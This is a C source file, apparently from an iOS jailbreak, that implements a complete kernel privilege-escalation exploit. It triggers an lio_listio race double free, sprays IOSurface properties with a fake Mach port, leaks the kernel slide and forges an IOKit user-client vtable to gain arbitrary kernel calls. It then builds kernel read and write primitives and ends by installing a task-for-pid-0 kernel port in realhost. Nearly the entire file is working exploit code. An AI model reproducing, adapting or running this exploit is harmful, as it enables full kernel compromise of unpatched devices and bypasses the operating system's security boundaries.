#include <mach/mach.h>
#include <sys/mman.h>
#include <pthread.h>
#include <dlfcn.h>
#include <aio.h>

#include "common.h"
#include "kdata.h"
#include "iokit.h"

#include "pwn.h"

/*  god forbid this ever changes  */
// #define KERNEL_IMAGE_BASE               0xfffffff007004000

// /*  function offsets  */
// #define COPYIN                          0xfffffff00719e88c // To find: `nm kernel | grep _copyin`
// #define COPYOUT                         0xfffffff00719eab0 // To find: `nm kernel | grep _copyout`
// // #define PROC_FIND                       0xfffffff0073ed31c // To find: `nm kernel | grep _proc_find`
// #define KERNEL_TASK                     0xfffffff0075d1048 // To find: `nm kernel | grep _kernel_task`
// #define CURRENT_TASK                    0xfffffff0070e8c0c // To find: `nm kernel | grep _current_task`
// #define HOST_PRIV_SELF                  0xfffffff0070c292c // To find: `nm kernel | grep _host_priv_self`
// #define GET_BSDTASK_INFO                0xfffffff0070fe7ec // To find: `nm kernel | grep _get_bsdtask_info`
// #define VM_MAP_WIRE_EXTERNAL            0xfffffff007148fe8 // To find: `nm kernel | grep _vm_map_wire_external`
// #define IOSURFACE_ROOTUC_VTAB_ADDR      0xfffffff006e73590 // To find: `iometa -Csv IOSurfaceRootUserClient kernel` (vtab=...)
// #define ADD_X0_X0_RET_GADGET            0xfffffff0063fddbc // To find (in r2): `"/c add x0, x0, 0x40; ret"`

// #define IPC_PORT_ALLOC_SPECIAL          0xfffffff0070ad1a8 // To find: strref "ipc_host_init" -> first call above
// #define IPC_KOBJECT_SET                 0xfffffff0070c3148 // To find: strref "ipc_host_init" -> first call below, after panic
// #define IPC_PORT_MAKE_SEND              0xfffffff0070ac924 // To find: strref "ipc_host_init" -> second call below, after panic

// #define ZONE_MAP                        0xfffffff0075f3e50 // To find: strref "zone_init" -> first qword just, below _kernel_map usage

// /*  struct offsets/sizes  */
// #define IS_TASK_OFFSET          0x28
// #define TASK_ITK_SELF           0xd8
// #define ITK_REGISTERED_OFFSET   0x2f0
// #define IPR_SIZE_OFFSET         0x8
// #define SIZEOF_TASK             0x5c8 // To find: streref "tasks" -> mov xx, #offset; should be in 0x550-0x600 range

// /*  IOSurface shenanigans  */
// #define IOSURFACE_CREATE_OUTSIZE    0xbc8
// #define IOSURFACE_CREATE_SURFACE    0
// #define IOSURFACE_SET_VALUE         9

/*  Mach spelunking  */
#define IO_BITS_ACTIVE      0x80000000
#define IOT_PORT            0
#define IKOT_TASK           2
#define IKOT_IOKIT_CONNECT  29

/*  # of AIO structs  */
#define NENT 1

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[1];
    char pad[4096];
} ool_message_struct;

typedef volatile union
{
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
            type     :  8;
            uint32_t pad;
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        kptr_t map;
    } a;
} ktask_t;

kern_return_t (^kcall)(uint64_t, int, ...);
uint64_t (^zonemap_fix_addr)(uint64_t);

void (^kreadbuf)(uint64_t, void *, size_t) ;
void (^kwritebuf)(uint64_t, void *, size_t);

uint32_t (^kread32)(uint64_t);
uint64_t (^kread64)(uint64_t);

void (^kwrite32)(uint64_t, uint32_t);
void (^kwrite64)(uint64_t, uint64_t);

uint64_t kslide;

bool should_run_race = true;

void *double_free(void *a)
{
    uint64_t err;
    
    int mode = LIO_NOWAIT;
    int nent = NENT;
    char buf[NENT];
    void *sigp = NULL;
    
    struct aiocb** aio_list = NULL;
    struct aiocb*  aios = NULL;
    
    char path[1024];
    snprintf(path, sizeof(path), "%slightspeed", getenv("TMPDIR"));
    
    int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
    if (fd < 0)
    {
        perror("open");
        goto exit;
    }
    
    /* prepare real aio */
    aio_list = malloc(nent * sizeof(*aio_list));
    if (aio_list == NULL)
    {
        perror("malloc");
        goto exit;
    }
    
    aios = malloc(nent * sizeof(*aios));
    if (aios == NULL)
    {
        perror("malloc");
        goto exit;
    }
    
    memset(aios, 0, nent * sizeof(*aios));
    for (uint32_t i = 0; i < nent; i++)
    {
        struct aiocb *aio = &aios[i];
        
        aio->aio_fildes = fd;
        aio->aio_offset = 0;
        aio->aio_buf = &buf[i];
        aio->aio_nbytes = 1;
        aio->aio_lio_opcode = LIO_READ; // change that to LIO_NOP for a DoS :D
        aio->aio_sigevent.sigev_notify = SIGEV_NONE;
        
        aio_list[i] = aio;
    }
    
    while (should_run_race)
    {
        err = lio_listio(mode, aio_list, nent, sigp);
        
        for (uint32_t i = 0; i < nent; i++)
        {
            /* check the return err of the aio to fully consume it */
            while (aio_error(aio_list[i]) == EINPROGRESS)
            {
                usleep(100);
            }
            err = aio_return(aio_list[i]);
        }
    }
    
exit:
    if (fd >= 0)
        close(fd);
    
    if (aio_list != NULL)
        free(aio_list);
    
    if (aios != NULL)
        free(aios);
    
    return NULL;
}

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

uint32_t curr_highest_key = 0;
uint32_t *get_me_some_spray_data(uint32_t surface_id, kport_t *fakeport, uint32_t *spray_count)
{
    uint32_t spray_qty = 10;
    
    *spray_count = (8 + (spray_qty * 5)) * sizeof(uint32_t);
    uint32_t *spray_data = malloc(*spray_count);
    
    uint32_t *spray_cur = spray_data;
    *(spray_cur++) = surface_id;
    *(spray_cur++) = 0x0;
    *(spray_cur++) = kOSSerializeMagic;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 3;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | 2;
    *(spray_cur++) = kOSSerializeSymbol | 4;
    *(spray_cur++) = transpose(curr_highest_key++) & 0x00ffffff;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | spray_qty;
    
    for (int i = 1; i <= spray_qty; i++)
    {
        *(spray_cur++) = (i == spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeData | 0x10;
        
        void *copy_to_here = spray_cur;
        *(spray_cur++) = 0xaaaaaaaa;
        *(spray_cur++) = 0xbbbbbbbb;
        *(spray_cur++) = 0x00000000;
        *(spray_cur++) = 0x00000000;
        
        memcpy(copy_to_here, &fakeport, sizeof(void *));
    }
    
    return spray_data;
}

kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
{
    kern_return_t ret = KERN_FAILURE;
    kport_t *fakeport                   = NULL;
    pthread_t lio_listio_thread         = NULL;
    mach_port_t *port_buffer            = NULL;
    mach_port_t notification_port       = MACH_PORT_NULL;
    mach_port_array_t maps              = NULL;
    mach_msg_type_number_t maps_num     = 0;
    
    uint64_t receiver_addr              = 0,
    our_task_addr                       = 0,
    ip_kobject_client_port_addr         = 0,
    ip_kobject_client_addr              = 0,
    client_vtab_addr                    = 0;

    LOG("---> pwning kernel...");

    kptr_t kaddr = kdata_init();
    if(!kaddr) goto out;

    // note to friends, family, next of kin, hackers alike:
    // host_page_size - returns the userland page size, *always* 16K
    // _host_page_size - MIG call, traps to kernel, returns PAGE_SIZE macro, will return the correct page size
    vm_size_t pgsize = 0x0;
    _host_page_size(mach_host_self(), &pgsize);
    LOG("page size: 0x%lx", pgsize);
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == MACH_PORT_NULL)
    {
        LOG("failed to get IOSurfaceRoot service");
        return KERN_FAILURE;
    }
    
    io_connect_t client = MACH_PORT_NULL;
    ret = IOServiceOpen(service, mach_task_self(), 0, &client);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to open IOSurfaceRoot user client: %x (%s)", ret, mach_error_string(ret));
        return KERN_FAILURE;
    }
    
    LOG("opened client: %x", client);
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0
    };
    
    typedef struct
    {
        mach_vm_address_t addr1;
        mach_vm_address_t addr2;
        uint32_t id;
    } surface_t;

    size_t size = offsets.iosurface.create_outsize;
    surface_t *surface = malloc(size);
    bzero(surface, size);

    ret = IOConnectCallStructMethod(client, offsets.iosurface.create_surface, dict_create, sizeof(dict_create), surface, &size);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call iosurface create surface");
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("surface ID: %x", surface->id);
    
    // setup ports for the ool msg
    port_buffer = malloc(sizeof(mach_port_t));
    *port_buffer = MACH_PORT_NULL;
    
    // setup ool message
    ool_message_struct ool_message, ool_message_recv;
    bzero(&ool_message, sizeof(ool_message));
    bzero(&ool_message_recv, sizeof(ool_message_recv));
    
    ool_message.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    ool_message.head.msgh_local_port = MACH_PORT_NULL;
    ool_message.head.msgh_size = sizeof(ool_message) - 2048;
    ool_message.msgh_body.msgh_descriptor_count = 1;
    ool_message.desc[0].address = port_buffer;
    ool_message.desc[0].count = 1;
    ool_message.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ool_message.desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    
    // setup fake obj
    fakeport = mmap(0, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    LOG("fakeport: %p", fakeport);
    bzero((void *)fakeport, 0x8000);
    
    mlock((void *)fakeport, 0x8000);
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT;
    fakeport->ip_references = 100;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
    fakeport->ip_srights = 99;
    
    mach_port_t fucking_ports[80000];
    for (int i = 0; i < 80000; i++)
    {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fucking_ports[i]);
        mach_port_insert_right(mach_task_self(), fucking_ports[i], fucking_ports[i], MACH_MSG_TYPE_MAKE_SEND);
    }
    
    uint32_t spray_dictsz = 0x0, dummy = 0x0;
    size = sizeof(dummy);
    
    LOG("spraying ports & racing...");
    
    // this will try to double free an obj as long as the second dword of it will be zero, obj is alloced in kalloc.16
    pthread_create(&lio_listio_thread, NULL, double_free, NULL);
    
    // race
    mach_port_t the_one = MACH_PORT_NULL;
    for (int i = 0; i < 80000; i++)
    {
        mach_port_t msg_port = fucking_ports[i];
        
        // sending the message
        ool_message.head.msgh_remote_port = msg_port;
        mach_msg(&ool_message.head, MACH_SEND_MSG, ool_message.head.msgh_size, 0, 0, 0, 0);
        
        // spray spray spray
        uint32_t *spray_data = get_me_some_spray_data(surface->id, fakeport, &spray_dictsz);
        
        IOConnectCallStructMethod(client, offsets.iosurface.set_value, spray_data, spray_dictsz, &dummy, &size);
        
        // recieve the messages and check if the port is not dead
        ool_message_recv.head.msgh_local_port = msg_port;
        mach_msg(&ool_message_recv.head, MACH_RCV_MSG, 0, sizeof(ool_message_recv), msg_port, 0, 0);
        
        free(spray_data);
        
        mach_port_t *check_port = ool_message_recv.desc[0].address;
        
        if (*check_port != MACH_PORT_NULL)
        {
            // wanna set this and stop racing asap
            should_run_race = false;
            
            the_one = *check_port;
            
            LOG("[!] found non-null port at 0x%x", the_one);
            
            break;
        }
        
        mach_msg_destroy(&ool_message_recv.head);
        mach_port_deallocate(mach_task_self(), msg_port);
        fucking_ports[i] = MACH_PORT_NULL;
    }
    
    if (the_one == MACH_PORT_NULL)
    {
        should_run_race = false;
    }
    
    // spray some more to ensure we fill any holes left from the race (not sure if this helps)
    for (int i = 0; i < 100; i++)
    {
        uint32_t spray_dictsz = 0;
        uint32_t *spray_data = get_me_some_spray_data(surface->id, fakeport, &spray_dictsz);
        
        uint32_t dummy = 0;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, offsets.iosurface.set_value, spray_data, spray_dictsz, &dummy, &size);
        
        free(spray_data);
        
        if (ret != KERN_SUCCESS)
        {
            LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
            ret = KERN_FAILURE;
            goto out;
        }
    }
    
    if (the_one == MACH_PORT_NULL)
    {
        LOG("ran out of ports :-(");
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("---> we out here!");
    
    for (int i = 0; i < 80000; i++)
    {
        if (fucking_ports[i] != the_one &&
            MACH_PORT_VALID(fucking_ports[i]))
        {
            mach_port_destroy(mach_task_self(), fucking_ports[i]);
            fucking_ports[i] = MACH_PORT_NULL;
        }
    }
    
    // allocate new port and assign it into port->ip_pdrequest to leak heap addr
    mach_port_t prev_port = MACH_PORT_NULL;
    ret = _kernelrpc_mach_port_allocate_trap(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
    if (ret != KERN_SUCCESS)
    {
        LOG("kernelrpc_mach_port_allocate_trap failed: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    ret = mach_port_request_notification(mach_task_self(), the_one, MACH_NOTIFY_PORT_DESTROYED, 0, notification_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev_port);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_port_request_notification %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    // insert a send right on the userland port
    ret = _kernelrpc_mach_port_insert_right_trap(mach_task_self(), the_one, the_one, MACH_MSG_TYPE_MAKE_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to insert send right on the_one: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    if (fakeport->ip_pdrequest == 0)
    {
        LOG("fakeport->ip_pdrequest == 0");
        ret = KERN_FAILURE;
        goto out;
    }
    
    uint64_t heapaddr = fakeport->ip_pdrequest;
    LOG("[+] got port/kernel heap address %llx", heapaddr);
    
    fakeport->ip_requests = ((uint64_t)fakeport) + 0x1000; // set that to somewhere in the buffer
    uint64_t *kread_addr = (uint64_t *)(((uint64_t)fakeport) + 0x1000 + offsets.struct_offsets.ipr_size); // kread_addr now points to where ip_requests points + offset of ipr_size
    
    mach_msg_type_number_t out_sz = 1;
    #define kr32(addr,value)\
    *kread_addr = addr;\
    mach_port_get_attributes(mach_task_self(), the_one, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)&value, &out_sz);
    
    uint32_t tmp_32read = 0;
    #define kr64(addr,value)\
    value = 0; \
    kr32(addr, value);\
    kr32(addr + 0x4, tmp_32read); \
    value = value | (((uint64_t)tmp_32read) << 32);
    
    // register the client we have onto our task
    ret = mach_ports_register(mach_task_self(), &client, 1);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call mach_ports_register on client: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    // get our task pointer
    kr64(heapaddr + offsetof(kport_t, ip_receiver), receiver_addr);
    LOG("[+] receiver addr %llx", receiver_addr);
    
    kr64(receiver_addr + offsets.struct_offsets.is_task_offset, our_task_addr);
    LOG("[+] our task addr %llx", our_task_addr);
    
    // get the vtab of the client
    kr64(our_task_addr + offsets.struct_offsets.itk_registered, ip_kobject_client_port_addr);
    LOG("[+] the address of our client port %llx", ip_kobject_client_port_addr);
    
    kr64(ip_kobject_client_port_addr + offsetof(kport_t, ip_kobject), ip_kobject_client_addr);
    LOG("[+] address of the UC %llx", ip_kobject_client_addr);
    
    kr64(ip_kobject_client_addr, client_vtab_addr);
    LOG("[+] kernel text leak/vtab addr %llx", client_vtab_addr);
    
    kslide = client_vtab_addr - offsets.vtabs.iosurface_root_userclient;
    LOG("[!] got kernel slide: %llx!", kslide);
    
    /*  set up arbitrary kernel call primitive  */
    
    uint64_t IOSurfaceRootUserClient_addr = ip_kobject_client_addr;
    uint64_t IOSurfaceRootUserClient_vtab = client_vtab_addr;
    
    // copy out vtable
    uint64_t fake_vtable = (uint64_t)fakeport + 0x4000;
    LOG("fake_vtable @ %llx", fake_vtable);
    
    for (int i = 0; i < 0x200; i++)
    {
        uint64_t vtab_entry = 0x0;
        kr64(IOSurfaceRootUserClient_vtab + (i * 0x8), vtab_entry);
        *(uint64_t *)(fake_vtable + (i * 0x8)) = vtab_entry;
    }
    
    // copy out cpp client object
    uint64_t fake_client = (uint64_t)fakeport + 0x2000;
    LOG("fake_client @ %llx", fake_client);
    
    for (int i = 0; i < 0x200; i++)
    {
        uint64_t obj_entry = 0x0;
        kr64(IOSurfaceRootUserClient_addr + (i * 0x8), obj_entry);
        *(uint64_t *)(fake_client + (i * 0x8)) = obj_entry;
    }
    
    // assign fake vtable into our fake client
    *(uint64_t *)(fake_client + 0x0) = fake_vtable;
    
    // update fakeport as iokit obj & insert new fake client
    fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT;
    fakeport->ip_kobject = fake_client;
    
    // patch getExternalTrapForIndex
    *(uint64_t *)(fake_vtable + (0xb7 * 0x8)) = offsets.gadgets.add_x0_x0_ret + kslide;
    
    // no longer needed
#undef kr32
#undef kr64
    
    kcall = ^(uint64_t addr, int n_args, ...)
    {
        if (n_args > 7)
        {
            LOG("no more than 7 args you cheeky fuck");
            return KERN_INVALID_ARGUMENT;
        }
        
        va_list ap;
        va_start(ap, n_args);
        
        uint64_t args[7] = { 0 };
        for (int i = 0; i < n_args; i++)
        {
            args[i] = va_arg(ap, uint64_t);
        }
        
        // first arg must always have a value
        if (n_args == 0 ||
            args[0] == 0x0)
        {
            args[0] = 0x1;
        }
        
        *(uint64_t *)(fake_client + 0x40) = args[0];
        *(uint64_t *)(fake_client + 0x48) = addr + kslide;
        return IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
    };
    
    /*  once we have an execution primitive we can use copyin/copyout funcs to freely read/write kernel mem  */
    
    kreadbuf = ^(uint64_t addr, void *buf, size_t len)
    {
        kcall(offsets.funcs.copyout, 3, addr, buf, len);
    };
    
    kread32 = ^(uint64_t addr)
    {
        uint32_t val = 0;
        kreadbuf(addr, &val, sizeof(val));
        return val;
    };
    
    kread64 = ^(uint64_t addr)
    {
        uint64_t val = 0;
        kreadbuf(addr, &val, sizeof(val));
        return val;
    };
    
    kwritebuf = ^(uint64_t addr, void *buf, size_t len)
    {
        kcall(offsets.funcs.copyin, 3, buf, addr, len);
    };
    
    kwrite32 = ^(uint64_t addr, uint32_t val)
    {
        kwritebuf(addr, &val, sizeof(val));
    };
    
    kwrite64 = ^(uint64_t addr, uint64_t val)
    {
        kwritebuf(addr, &val, sizeof(val));
    };
    
    uint64_t zone_map_addr = kread64(offsets.data.zone_map + kslide);
    if (zone_map_addr == 0x0)
    {
        LOG("failed to get zone map addr");
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("[+] got zone map addr: %llx", zone_map_addr);
    
    typedef volatile struct
    {
        kptr_t prev;
        kptr_t next;
        kptr_t start;
        kptr_t end;
    } kmap_hdr_t;
    
    kmap_hdr_t zm_hdr = { 0 };
    
    // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
    kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));
    
    LOG("zmap start: %llx", zm_hdr.start);
    LOG("zmap end: %llx", zm_hdr.end);
    
    uint64_t zm_size = zm_hdr.end - zm_hdr.start;
    LOG("zmap size: %llx", zm_size);
    
    if (zm_size > 0x100000000)
    {
        LOG("zonemap too large :/");
        ret = KERN_FAILURE;
        goto out;
    }
    
    zonemap_fix_addr = ^(uint64_t addr)
    {
        uint64_t spelunk = (zm_hdr.start & 0xffffffff00000000) | (addr & 0xffffffff);
        return spelunk < zm_hdr.start ? spelunk + 0x100000000 : spelunk;
    };
    
    uint64_t kern_task_addr = kread64(offsets.data.kernel_task + kslide);
    if (kern_task_addr == 0x0)
    {
        LOG("failed to read kern_task_addr!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] kern_task_addr: %llx", kern_task_addr);
    
    uint64_t kern_proc = zonemap_fix_addr(kcall(offsets.funcs.get_bsdtask_info, 1, kern_task_addr));
    if (kern_proc == 0x0)
    {
        LOG("failed to read kern_proc!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] got kernproc: %llx", kern_proc);;
    
    uint64_t curr_task = zonemap_fix_addr(kcall(offsets.funcs.current_task, 0));
    if (curr_task == 0x0)
    {
        LOG("failed to get curr_task!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] curr task: %llx", curr_task);
    
    // get kernel map
    uint64_t kernel_vm_map = kread64(kern_task_addr + 0x20);
    if (kernel_vm_map == 0x0)
    {
        LOG("failed to read kernel_vm_map!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel vm map: %llx", kernel_vm_map);
    
    uint64_t ipc_space_kernel = kread64(ip_kobject_client_port_addr + offsetof(kport_t, ip_receiver));;
    if (ipc_space_kernel == 0x0)
    {
        LOG("failed to read ipc_space_kernel!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ipc_space_kernel: %llx", ipc_space_kernel);
    
    uint64_t ptrs[2] = { 0 };
    ptrs[0] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    ptrs[1] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    LOG("zm_port addr: %llx", ptrs[0]);
    LOG("km_port addr: %llx", ptrs[1]);
    
    // set up our two ktask_t structs
    ktask_t *zm_task_buf = (ktask_t *)((uint64_t)fakeport + 0x6000);
    bzero((void *)zm_task_buf, 0x2000);
    LOG("zm_task_buf: %llx", (uint64_t)zm_task_buf);
    
    zm_task_buf->a.lock.data = 0x0;
    zm_task_buf->a.lock.type = 0x22;
    zm_task_buf->a.ref_count = 100;
    zm_task_buf->a.active = 1;
    *(kptr_t *)((uint64_t)zm_task_buf + offsets.struct_offsets.task_itk_self) = 1;
    zm_task_buf->a.map = zone_map_addr;

    ktask_t *km_task_buf = (ktask_t *)((uint64_t)fakeport + 0x7000);
    memcpy((void *)km_task_buf, (const void *)zm_task_buf, sizeof(ktask_t));
    km_task_buf->a.map = kernel_vm_map;
    LOG("km_task_buf: %llx", (uint64_t)km_task_buf);
    
    kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[0], (uint64_t)zm_task_buf, IKOT_TASK);
    kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[1], (uint64_t)km_task_buf, IKOT_TASK);
    
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, ptrs[0]);
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, ptrs[1]);
    
    usleep(50000);
    
    ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);
    
    if (!MACH_PORT_VALID(maps[0]) ||
        !MACH_PORT_VALID(maps[1]))
    {
        LOG("invalid zone/kernel map ports");
        ret = KERN_FAILURE;
        goto out;
    }
    
    ptrs[0] = ptrs[1] = 0x0;
    
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, 0x0);
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, 0x0);
    
    LOG("kern_task_addr: %llx", kern_task_addr);
    
    mach_vm_address_t remap_addr = 0x0;
    vm_prot_t cur = 0x0, max = 0x0;
    ret = mach_vm_remap(maps[1], &remap_addr, offsets.struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_vm_remap failed: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("[+] remap addr: %llx", remap_addr);

    usleep(500000);
    
    mach_port_destroy(mach_task_self(), maps[0]);
    mach_port_destroy(mach_task_self(), maps[1]);
    
    // remap must cover one page
    uint64_t remap_start = remap_addr & ~(pgsize - 1);
    uint64_t remap_end = remap_start + pgsize;
    
    // kern_return_t vm_map_wire_external(vm_map_t map, vm_map_offset_t start, vm_map_offset_t end, vm_prot_t caller_prot, boolean_t user_wire)
    ret = kcall(offsets.funcs.vm_map_wire_external, 5, kernel_vm_map, remap_start, remap_end, VM_PROT_READ | VM_PROT_WRITE, false);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to kcall vm_map_wire_external: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    uint64_t new_port = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    LOG("new_port: %llx", new_port);
    
    usleep(500000);

    kcall(offsets.funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
    kcall(offsets.funcs.ipc_port_make_send, 1, new_port);
    
    uint64_t realhost = offsets.data.realhost + kslide;
    LOG("[!] realhost: %llx", realhost);
    
    // realhost->special[4]
    kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
    LOG("registered realhost->special[4]");

    // zero out old ports before overwriting
    for (int i = 0; i < 3; i++)
    {
        kwrite64(curr_task + offsets.struct_offsets.itk_registered + (i * 0x8), 0x0);
    }

    kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
    LOG("wrote new port: %llx", new_port);
    
    // usleep(500000);
    
    ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
    
//    kwrite64(curr_task + ITK_REGISTERED_OFFSET, 0x0);

    if (ret != KERN_SUCCESS)
    {
        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    mach_port_t kernel_task = maps[0];
    if (!MACH_PORT_VALID(kernel_task))
    {
        LOG("kernel_task is invalid");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel task port: %x", kernel_task);

    // should be ready? pullup !

    uint64_t kernel_base = offsets.constant.kernel_image_base + kslide;

    // test tfp0
    vm_offset_t data_out = 0x0;
    mach_msg_type_number_t out_size = 0x0;
    ret = mach_vm_read(kernel_task, kernel_base, sizeof(uint64_t), &data_out, &out_size);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed read on kern base via tfp0: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("---> task for pid 0 achieved!");
    LOG("[!] kernel base data: %llx", *(uint64_t *)data_out);
    
    LOG("---> exploitation complete.");
    
    *tfp0 = kernel_task;
    *kbase = kernel_base;

    ret = KERN_SUCCESS;
out:;
    kdata_cleanup();

    return ret;
}
